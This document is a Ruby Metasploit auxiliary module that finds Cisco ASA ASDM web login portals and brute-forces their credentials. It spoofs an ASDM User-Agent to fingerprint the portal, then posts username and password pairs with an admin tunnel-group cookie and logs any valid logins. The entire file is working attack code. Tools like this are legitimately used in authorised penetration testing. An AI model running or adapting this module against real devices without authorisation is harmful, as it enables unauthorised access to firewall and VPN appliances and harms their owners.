##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/proto/http'
require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Cisco ASA ASDM Bruteforce Login Utility',
      'Description'    => %{
        This module scans for Cisco ASA ASDM web login portals and 
        performs login brute force to identify valid credentials.
      },
      'Author'         =>
        [
          'Jonathan Claudius <jclaudius[at]trustwave.com>',
        ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        Opt::RPORT(443),
        OptBool.new('SSL', [true, "Negotiate SSL for outgoing connections", true]),
        OptString.new('USERNAME', [true, "A specific username to authenticate as", 'cisco']),
        OptString.new('PASSWORD', [true, "A specific password to authenticate with", 'cisco'])
      ], self.class)
  end

  def run_host(ip)
    unless check_conn?
      print_error("#{peer} - Connection failed, Aborting...")
      return
    end

    unless is_app_asdm?
      print_error("#{peer} - Application does not appear to be Cisco ASA ASDM. Module will not continue.")
      return
    end

    print_status("#{peer} - Application appears to be Cisco ASA ASDM. Module will continue.")

    print_status("#{peer} - Starting login brute force...")
    each_user_pass do |user, pass|
      do_login(user, pass)
    end
  end

  # Verify whether the connection is working or not
  def check_conn?
    begin
      res = send_request_cgi(
      {
        'uri'       => '/',
        'method'    => 'GET'
      })
      print_good("#{peer} - Server is responsive...")
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
      return
    end
  end

  # Verify whether we're working with ASDM or not
  def is_app_asdm?
      res = send_request_raw(
      {
        'uri'       => '/+webvpn+/index.html',
        'method'    => 'GET',
        'headers' => {
          'User-Agent' => 'ASDM/ Java/1.6.0_65'
        }
      })

      if res &&
         res.code == 200 &&
         res.headers['Set-Cookie'].match(/webvpn/)
         
        return true
      else
        return false
      end
  end

  # Brute-force the login page
  def do_login(user, pass)
    vprint_status("#{peer} - Trying username:#{user.inspect} with password:#{pass.inspect}")
    begin
      res = send_request_raw({
        'uri'       => '/+webvpn+/index.html',
        'method'    => 'POST',
        'headers' => {
          'User-Agent' => 'ASDM/ Java/1.6.0_65',
          'Content-Type' => 'application/x-www-form-urlencoded; charset=UTF-8',
          'Cookie'    => 'webvpnlogin=1; tg=0DefaultADMINGroup'
        },
        'data' => "username=#{user}&password=#{pass}&tgroup=DefaultADMINGroup"
      })

      if res &&
         res.code == 200 &&
         res.body.match(/SSL VPN Service/) &&
         res.body.match(/Success/) &&
         res.body.match(/success/)

        print_good("#{peer} - SUCCESSFUL LOGIN - #{user.inspect}:#{pass.inspect}")

        report_hash = {
          :host   => rhost,
          :port   => rport,
          :sname  => 'Cisco ASA ASDM',
          :user   => user,
          :pass   => pass,
          :active => true,
          :type => 'password'
        }

        report_auth_info(report_hash)
        return :next_user

      else
        vprint_error("#{peer} - FAILED LOGIN - #{user.inspect}:#{pass.inspect}")
      end

    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
      print_error("#{peer} - HTTP Connection Failed, Aborting")
      return :abort
    end
  end
end